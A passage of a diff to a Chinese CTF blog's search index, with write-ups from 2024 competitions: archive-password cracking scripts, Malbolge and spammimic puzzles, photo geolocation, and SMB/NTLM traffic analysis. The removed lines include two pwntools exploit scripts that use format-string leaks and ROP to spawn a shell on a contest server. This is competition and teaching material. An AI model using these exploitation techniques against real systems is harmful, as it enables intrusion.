class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> target:</span><br><span class="line">                    shutil.copyfileobj(source, target)</span><br><span class="line">            <span class="keyword">except</span> RuntimeError:</span><br><span class="line">                <span class="comment"># 如果文件被加密，则将其保存到根目录下</span></span><br><span class="line">                target_path = os.path.join(root_directory, <span class="built_in">str</span>(uuid.uuid4()) + <span class="string">&quot;_&quot;</span> + filename)</span><br><span class="line">                <span class="keyword">with</span> source, <span class="built_in">open</span>(target_path, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> target:</span><br><span class="line">                    shutil.copyfileobj(source, target)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recursive_unzip</span>(<span class="params">directory, root_directory</span>):</span><br><span class="line">    <span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(directory):</span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">            <span class="keyword">if</span> file.endswith(<span class="string">&#x27;.zip&#x27;</span>) <span class="keyword">and</span> <span class="keyword">not</span> file.endswith(<span class="string">&#x27;.dic&#x27;</span>):</span><br><span class="line">                file_path = os.path.join(root, file)</span><br><span class="line">                extract_to = os.path.join(root, os.path.splitext(file)[<span class="number">0</span>])</span><br><span class="line">                os.makedirs(extract_to, exist_ok=<span class="literal">True</span>)</span><br><span class="line">                extract_all(file_path, extract_to, root_directory)</span><br><span class="line">                recursive_unzip(extract_to, root_directory)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    start_directory = <span class="string">r&quot;\\?\C:\Users\67300\Downloads\11&quot;</span></span><br><span class="line">    recursive_unzip(start_directory, start_directory)</span><br></pre></td></tr></table></figure>
-<p>查看python的报错信息和使用everything直接得到最内层的文件</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016121031728.png"
-                        alt="image-20241016121031728"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020105852465.png"
+                        alt="image-20241020105852465"
                  ></p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016121119612.png"
-                        alt="image-20241016121119612"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020105904760.png"
+                        alt="image-20241020105904760"
+                 ></p>
+<p>仔细观察左下角，应该不是定位块，猜测二维码被偏移+旋转，修复后得到密文</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020105918057.png"
+                        alt="image-20241020105918057"
                  ></p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016121223773.png"
-                        alt="image-20241016121223773"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020105927470.png"
+                        alt="image-20241020105927470"
                  ></p>
-<p>每个压缩包下有一个.dic文件，应该密码就在这300个字典中</p>
-<p>写python脚本提取这300个字典</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_zip</span>(<span class="params">zip_path, output_dir</span>):</span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(zip_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zip_ref:</span><br><span class="line">        <span class="keyword">with</span> tempfile.TemporaryDirectory() <span class="keyword">as</span> temp_dir:</span><br><span class="line">            zip_ref.extractall(temp_dir)</span><br><span class="line">            <span class="keyword">for</span> root, _, files <span class="keyword">in</span> os.walk(temp_dir):</span><br><span class="line">                <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">                    file_path = os.path.join(root, file)</span><br><span class="line">                    <span class="keyword">if</span> file.endswith(<span class="string">&#x27;.zip&#x27;</span>):</span><br><span class="line">                        extract_zip(file_path, output_dir)</span><br><span class="line">                    <span class="keyword">elif</span> file.endswith(<span class="string">&#x27;.dic&#x27;</span>):</span><br><span class="line">                        shutil.move(file_path, os.path.join(output_dir, file))</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&#x27;Extracted <span class="subst">&#123;file&#125;</span> to <span class="subst">&#123;output_dir&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            shutil.rmtree(temp_dir)</span><br><span class="line"></span><br><span class="line">zip_dir = <span class="string">&#x27;C:/Users/67300/Downloads/鼠标不妙题/&#x27;</span></span><br><span class="line">output_dir = <span class="string">&#x27;C:/Users/67300/Downloads/鼠标不妙题/111&#x27;</span></span><br><span class="line"></span><br><span class="line">os.makedirs(output_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(zip_dir):</span><br><span class="line">    <span class="keyword">if</span> filename.endswith(<span class="string">&#x27;.zip&#x27;</span>):</span><br><span class="line">        zip_path = os.path.join(zip_dir, filename)</span><br><span class="line">        extract_zip(zip_path, output_dir)</span><br><span class="line">    <span class="keyword">if</span> filename.endswith(<span class="string">&#x27;.zip&#x27;</span>):</span><br><span class="line">        zip_path = os.path.join(zip_dir, filename)</span><br><span class="line">        extract_zip(zip_path, output_dir)</span><br></pre></td></tr></table></figure>
-<p>将300个字典合并成1个，然后跑字典爆破密码</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">output_dir = <span class="string">&#x27;C:/Users/67300/Downloads/鼠标不妙题/111&#x27;</span></span><br><span class="line">combined_file_path = <span class="string">&#x27;C:/Users/67300/Downloads/鼠标不妙题/combined.dic&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(combined_file_path, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> combined_file:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(output_dir):</span><br><span class="line">        <span class="keyword">if</span> filename.endswith(<span class="string">&#x27;.dic&#x27;</span>):</span><br><span class="line">            dic_file_path = os.path.join(output_dir, filename)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(dic_file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> dic_file:</span><br><span class="line">                content = dic_file.read()</span><br><span class="line">                combined_file.write(content)</span><br><span class="line">                combined_file.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;All .dic files have been combined into <span class="subst">&#123;combined_file_path&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>[YG{VDTveRc10qpnJ+<em>)G!~f1{d@-}v&lt;)9xqYonsrqj0hPlkdcb(<code>Hd]#a</code>_A@VzZY;Qu8NMqKPONGkK-,BGF?cCBA@&quot;&gt;76Z:321U54-21</em>Non,+*#G’&amp;%d"y?w_uzsr8vunVrk1ongOe+ihgfeG]#[ZY^W\UZSwWVUNrRQ3IHGLEiCBAFE>=aA:9>765:981Uvu-2+O/.nm+Hi’~}|B&quot;!~}|u]s9qYonsrqj0hmlkjc)gIedcb[!YX]\UZSwWVUN6LpP2HMFEDhHG@dDCBA:^!~&lt;;:921U/u3,+<em>Non&amp;%</em>)('&amp;}C{cy?}|{zs[q7unVl2ponmleMib(fHG]b[Z~k</p>
+</blockquote>
+<p>这个时候回头去看图片的名字：M41b0lg3.png</p>
+<p>把M41b0lg3转换为malbolge，上网一搜发现是一种编程语言，直接在线网站运行即可得到flag</p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="C:/Users/67300/AppData/Roaming/Typora/typora-user-images/image-20241016113045440.png"
-                        alt="image-20241016113045440"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020105949204.png"
+                        alt="image-20241020105949204"
+                 ></p>
+<h3 id="Find-way-to-read-video">Find way to read video</h3>
+<p>社工题，每个队伍得到的用户名不一样，所以flag也不一样，综合了几个队伍得到用户名形式是：五个英文+四个数字</p>
+<p>附件解压出来的TXT就以下内容：</p>
+<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">bonan7654 has put his email template on a public platform.</span><br></pre></td></tr></table></figure>
+<p>结果最终在GitCode上，社了一下午+一晚上，，结果这屎题在这种屎平台上</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020112816702.png"
+                        alt="image-20241020112816702"
+                 ></p>
+<p>然后根据<code>垃圾邮箱隐写</code>一类的提示，找到<code>spam</code></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020112915512.png"
+                        alt="image-20241020112915512"
+                 ></p>
+<p>联想到<code>spammimic</code>隐写，直接在线网站：</p>
+<p><a class="link"   href="https://www.spammimic.com/decode.cgi" >https://www.spammimic.com/decode.cgi<i class="fas fa-external-link-alt"></i></a></p>
+]]></content>
+      <categories>
+        <category>题解</category>
+      </categories>
+      <tags>
+        <tag>Misc</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2024 强网杯初赛 Misc方向 部分WriteUp</title>
+    <url>//post/2024qwb/</url>
+    <content><![CDATA[<h3 id="givemesecret">givemesecret</h3>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/c8c2231ec4b2b987ee88aabff280a0eb.png"
+                        alt="c8c2231ec4b2b987ee88aabff280a0eb"
+                 ></p>
+<h3 id="Master-Of-OSINT">Master Of OSINT</h3>
+<p>图1：看上去像是西北方，应该在内蒙新疆青海一带，最远处有一篇湖，百度地图一个个找过去最终在找到地点：</p>
+<p><code>青海省海南藏族自治州共和县倒湖茶公路</code></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://oss.carbo.ink/2024qiangwang/misc-1.png"
+                        alt="misc-1"
+                 ></p>
+<p>图2：根据图片最右侧的建筑，有一个明显的百安居，根据这个建筑入手找到<code>上海浦东新区 百安居(龙阳店)</code></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://oss.carbo.ink/2024qiangwang/misc-2.png"
+                        alt="misc-2"
+                 ></p>
+<p>图4：根据图中卡车所属公司<code>浙通物流</code>，位于杭州萧山，加上我经常去杭州感觉这个隔音栏就像杭州绕城高速 <code>优美爱有限公司附近</code></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://oss.carbo.ink/2024qiangwang/misc-3.png"
+                        alt="misc-3"
+                 ></p>
+<p>图5：根据建筑立体和蓝白色围栏初步判定在重庆 <code>重庆市九龙坡区谢家湾立交桥</code></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://oss.carbo.ink/2024qiangwang/misc-4.png"
+                        alt="misc-4"
+                 ></p>
+<p>图6：根据建筑密度和风格判定在东南方大城市，远处有一个类似H形的建筑 <code>南京聚宝楼招待所</code> 附近</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://oss.carbo.ink/2024qiangwang/misc-5.png"
+                        alt="misc-5"
+                 ></p>
+<p>图7：初步判定大城市，有河，远处有一栋特征明显建筑 <code>湖南省长沙市岳麓区五一大道橘子洲大桥</code></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://oss.carbo.ink/2024qiangwang/misc-6.png"
+                        alt="misc-6"
+                 ></p>
+<p>图8：应该是海，但是颜色不蓝，可能是入海口的地方，有风车 <code>上海市崇明区G40(沪陕高速)</code></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://oss.carbo.ink/2024qiangwang/misc-7.png"
+                        alt="misc-7"
+                 ></p>
+<p>图9：根据吊桥顶部形状，根据谷歌识图找到这篇文章<a class="link"   href="https://www.gov.cn/jrzg/2009-12/26/content_1497241.htm" >https://www.gov.cn/jrzg/2009-12/26/content_1497241.htm<i class="fas fa-external-link-alt"></i></a> 确定位置：<code>湖北省武汉市青山区武汉天兴洲长江大桥</code></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://oss.carbo.ink/2024qiangwang/misc-8.png"
+                        alt="misc-8"
+                 ></p>
+<p>图10：根据立交桥一行字<code>中铁三局集团解说促进浙江经济发展</code>，识图找到<code>新塘高铁公园</code></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://oss.carbo.ink/2024qiangwang/misc-9.png"
+                        alt="misc-9"
                  ></p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016113315654.png"
-                        alt="image-20241016113315654"
+                       data-src="https://oss.carbo.ink/2024qiangwang/misc-10.png"
+                        alt="misc-10"
                  ></p>
-<p>看了一下f_几就嵌套几层，可以直接用everything一把梭，找到文件，每个文件是base64的一段</p>
+<h3 id="谍影重重5-0">谍影重重5.0</h3>
+<p>在协议分级中可以初步判断一下流量的种类</p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016113621322.png"
-                        alt="image-20241016113621322"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241106154448407.png"
+                        alt="image-20241106154448407"
                  ></p>
+<p>可以看到有很多加密后的SMB3流量，可以根据这篇博客<a class="link"   href="https://blog.csdn.net/qq_30464257/article/details/142205308" >SMB流量分析<i class="fas fa-external-link-alt"></i></a>了解SMB流量协议的组成，在<code>Frame 122</code>中找到<code>NTLM的Hash</code>，也找到很多RDP流量</p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016113824170.png"
-                        alt="image-20241016113824170"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241106155124903.png"
+                        alt="image-20241106155124903"
                  ></p>
-<h3 id="Pwn">Pwn</h3>
-<h4 id="book">book</h4>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, timeout = <span class="number">5</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">binary = <span class="string">&#x27;./book&#x27;</span></span><br><span class="line">elf = ELF(binary, checksec=<span class="literal">False</span>)</span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    libc = elf.libc</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">    host = <span class="string">&#x27;139.155.126.78&#x27;</span></span><br><span class="line">    port = <span class="string">&#x27;31248&#x27;</span></span><br><span class="line">    p = remote(host,port)</span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> delim, data:     p.sendlineafter(delim, data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> delim, data:     p.sendafter(delim, data)</span><br><span class="line">s   = <span class="keyword">lambda</span> data:            p.send(data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data:            p.sendline(data)</span><br><span class="line">ru  = <span class="keyword">lambda</span> delim, **kwargs: p.recvuntil(delim, **kwargs)</span><br><span class="line">io  = <span class="keyword">lambda</span>:                 p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&quot;&gt;&gt;&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmt</span>(<span class="params">payload</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sa(<span class="string">b&quot;name:\n&quot;</span>, payload)</span><br><span class="line">    ru(<span class="string">b&quot;name is:\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">payload</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    ru(<span class="string">b&quot;write\n&quot;</span>)</span><br><span class="line">    s(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    fmt(<span class="string">&quot;%8$p-%19$p-%13$p&quot;</span>)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">    codebase = <span class="built_in">int</span>(p.recvn(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x14a0</span></span><br><span class="line">    ru(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">    libc.address = <span class="built_in">int</span>(p.recvn(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x24083</span></span><br><span class="line">    ru(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">    canary = <span class="built_in">int</span>(p.recvn(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    system = libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">    binsh = <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">    success(<span class="string">f&quot;libc: <span class="subst">&#123;libc.address:#x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    b = codebase + <span class="number">0x4068</span></span><br><span class="line">    pop_rdi_ret = codebase + <span class="number">0x0000000000001503</span></span><br><span class="line">    ret = pop_rdi_ret + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    pay = fmtstr_payload(<span class="number">6</span>, &#123;b : <span class="number">0x200</span>&#125;)</span><br><span class="line">    fmt(pay)</span><br><span class="line"></span><br><span class="line">    pay = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span> + p64(canary) + p64(<span class="number">0</span>) + p64(ret) + p64(pop_rdi_ret) + p64(binsh) + p64(system) </span><br><span class="line">    attack(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    io()</span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>
-<h4 id="magic-fmt">magic_fmt</h4>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, timeout = <span class="number">5</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">binary = <span class="string">&#x27;./magic_fmt&#x27;</span></span><br><span class="line">elf = ELF(binary, checksec=<span class="literal">False</span>)</span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    libc = elf.libc</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">    host = <span class="string">&#x27;139.155.126.78&#x27;</span></span><br><span class="line">    port = <span class="string">&#x27;37023&#x27;</span></span><br><span class="line">    p = remote(host,port)</span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> delim, data:     p.sendlineafter(delim, data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> delim, data:     p.sendafter(delim, data)</span><br><span class="line">s   = <span class="keyword">lambda</span> data:            p.send(data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data:            p.sendline(data)</span><br><span class="line">ru  = <span class="keyword">lambda</span> delim, **kwargs: p.recvuntil(delim, **kwargs)</span><br><span class="line">io  = <span class="keyword">lambda</span>:                 p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    ru(<span class="string">b&quot;possess\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    pay = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe0</span></span><br><span class="line">    s(pay)</span><br><span class="line">    ru(<span class="string">b&quot;can &quot;</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe0</span>)</span><br><span class="line"></span><br><span class="line">    ret_addr = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) + <span class="number">0x8</span></span><br><span class="line">    success(<span class="string">f&quot;ret: <span class="subst">&#123;ret_addr:#x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">b&quot;else?\n&quot;</span>)</span><br><span class="line">    pay = p64(ret_addr)</span><br><span class="line"></span><br><span class="line">    s(pay)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">b&quot;have?\n&quot;</span>)</span><br><span class="line">    pay = <span class="string">f&quot;%45$p%<span class="subst">&#123;<span class="number">0x68</span>-<span class="number">14</span>&#125;</span>c%6$hhn&quot;</span>.encode()</span><br><span class="line">    s(pay)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">b&quot;magic:\n&quot;</span>)</span><br><span class="line">    ru(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">    libc.address = <span class="built_in">int</span>(p.recvn(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x29d90</span></span><br><span class="line">    pop_rdi_ret = libc.address + <span class="number">0x000000000002a3e5</span></span><br><span class="line">    ret = pop_rdi_ret + <span class="number">1</span></span><br><span class="line">    system = libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">    binsh = <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">    success(<span class="string">f&quot;libc: <span class="subst">&#123;libc.address:#x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    rsp = ret_addr - <span class="number">0x118</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ru(<span class="string">b&quot;possess\n&quot;</span>)</span><br><span class="line">    pay = p64(ret_addr) + fit(ret, pop_rdi_ret, binsh, system)</span><br><span class="line">    s(pay)</span><br><span class="line"></span><br><span class="line">    sa(<span class="string">b&quot;else?&quot;</span>, pay)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">b&quot;have?\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    rbp_offset = <span class="number">34</span></span><br><span class="line"></span><br><span class="line">    pay = <span class="string">f&quot;%<span class="subst">&#123;<span class="number">0x8B</span>&#125;</span>c%6$hhn%<span class="subst">&#123;(rsp&amp;<span class="number">0xffff</span>) - <span class="number">0x8b</span>&#125;</span>c%<span class="subst">&#123;rbp_offset&#125;</span>$hn&quot;</span>.encode()</span><br><span class="line">    <span class="comment"># gdb.attach(p, &quot;bbase 0x1327&quot;)</span></span><br><span class="line">    s(pay)</span><br><span class="line"></span><br><span class="line">    io()</span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>
-<h3 id="Reverse">Reverse</h3>
-<h4 id="easy-choice">easy_choice</h4>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> delta 0x9e3779b9</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> w[<span class="number">8</span>] = &#123;<span class="number">0xAC3A28FD</span>, <span class="number">0x2331590C</span>, <span class="number">0x329F681B</span>, <span class="number">0xA6CF62DB</span>, <span class="number">0x8738A413</span>, <span class="number">0x44D27414</span>, <span class="number">0xDEF3A4CD</span>, <span class="number">0x5B22BA91</span>&#125;;<span class="comment">//可改</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> v[<span class="number">2</span>];</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">4</span>] = &#123;<span class="number">0x41</span>,<span class="number">0x53</span>,<span class="number">0x43</span>,<span class="number">0x54</span>&#125;;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> sum;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> y,z,p,rounds,e;</span><br><span class="line">	<span class="type">int</span> n = <span class="number">2</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> key2[<span class="number">4</span>]=&#123;<span class="number">0x54</span>,<span class="number">0x4f</span>,<span class="number">0x44</span>,<span class="number">0x41</span>&#125;;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> o=<span class="number">0</span>;o&lt;<span class="number">4</span>;o++)</span><br><span class="line">	&#123;	</span><br><span class="line">		rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">		v[<span class="number">0</span>]=w[<span class="number">2</span>*o];</span><br><span class="line">		v[<span class="number">1</span>]=w[<span class="number">2</span>*o+<span class="number">1</span>];</span><br><span class="line">		sum = rounds*delta;</span><br><span class="line">		y = v[<span class="number">0</span>];</span><br><span class="line">		<span class="keyword">do</span></span><br><span class="line">		&#123;</span><br><span class="line">			e = sum &gt;&gt; <span class="number">2</span> &amp; <span class="number">3</span>;</span><br><span class="line">			<span class="keyword">for</span>(p=n<span class="number">-1</span>;p&gt;<span class="number">0</span>;p--)</span><br><span class="line">			&#123;</span><br><span class="line">				z = v[p<span class="number">-1</span>];</span><br><span class="line">				v[p] -= ((((z&gt;&gt;<span class="number">5</span>)^(y&lt;&lt;<span class="number">2</span>))+((y&gt;&gt;<span class="number">3</span>)^(z&lt;&lt;<span class="number">4</span>))) ^ ((key[(p&amp;<span class="number">3</span>)^e]^z)+(y ^ sum)));</span><br><span class="line">				y = v[p];</span><br><span class="line">			&#125;</span><br><span class="line">			z = v[n<span class="number">-1</span>];</span><br><span class="line">			v[<span class="number">0</span>] -= (((key[(p^e)&amp;<span class="number">3</span>]^z)+(y ^ sum)) ^ (((y&lt;&lt;<span class="number">2</span>)^(z&gt;&gt;<span class="number">5</span>))+((z&lt;&lt;<span class="number">4</span>)^(y&gt;&gt;<span class="number">3</span>))));</span><br><span class="line">			y = v[<span class="number">0</span>];</span><br><span class="line">			sum -= delta;</span><br><span class="line">		&#125;<span class="keyword">while</span>(--rounds);</span><br><span class="line">		rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">		y = v[<span class="number">0</span>];</span><br><span class="line">		sum = rounds*delta;</span><br><span class="line">		<span class="keyword">do</span></span><br><span class="line">		&#123;</span><br><span class="line">			e = sum &gt;&gt; <span class="number">2</span> &amp; <span class="number">3</span>;</span><br><span class="line">			<span class="keyword">for</span>(p=n<span class="number">-1</span>;p&gt;<span class="number">0</span>;p--)</span><br><span class="line">			&#123;</span><br><span class="line">				z = v[p<span class="number">-1</span>];</span><br><span class="line">				v[p] -= ((((z&gt;&gt;<span class="number">5</span>)^(y&lt;&lt;<span class="number">2</span>))+((y&gt;&gt;<span class="number">3</span>)^(z&lt;&lt;<span class="number">4</span>))) ^ ((key2[(p&amp;<span class="number">3</span>)^e]^z)+(y ^ sum)));</span><br><span class="line">				y = v[p];</span><br><span class="line">			&#125;</span><br><span class="line">			z = v[n<span class="number">-1</span>];</span><br><span class="line">			v[<span class="number">0</span>] -= (((key2[(p^e)&amp;<span class="number">3</span>]^z)+(y ^ sum)) ^ (((y&lt;&lt;<span class="number">2</span>)^(z&gt;&gt;<span class="number">5</span>))+((z&lt;&lt;<span class="number">4</span>)^(y&gt;&gt;<span class="number">3</span>))));</span><br><span class="line">			y = v[<span class="number">0</span>];</span><br><span class="line">			sum = sum-delta;</span><br><span class="line">		&#125;<span class="keyword">while</span>(--rounds);</span><br><span class="line">		w[<span class="number">2</span>*o]=v[<span class="number">0</span>];</span><br><span class="line">		w[<span class="number">2</span>*o+<span class="number">1</span>]=v[<span class="number">1</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%c%c%c%c&quot;</span>,*((<span class="type">char</span>*)&amp;w[i]+<span class="number">0</span>),*((<span class="type">char</span>*)&amp;w[i]+<span class="number">1</span>),*((<span class="type">char</span>*)&amp;w[i]+<span class="number">2</span>),*((<span class="type">char</span>*)&amp;w[i]+<span class="number">3</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>根据这篇文章：</p>
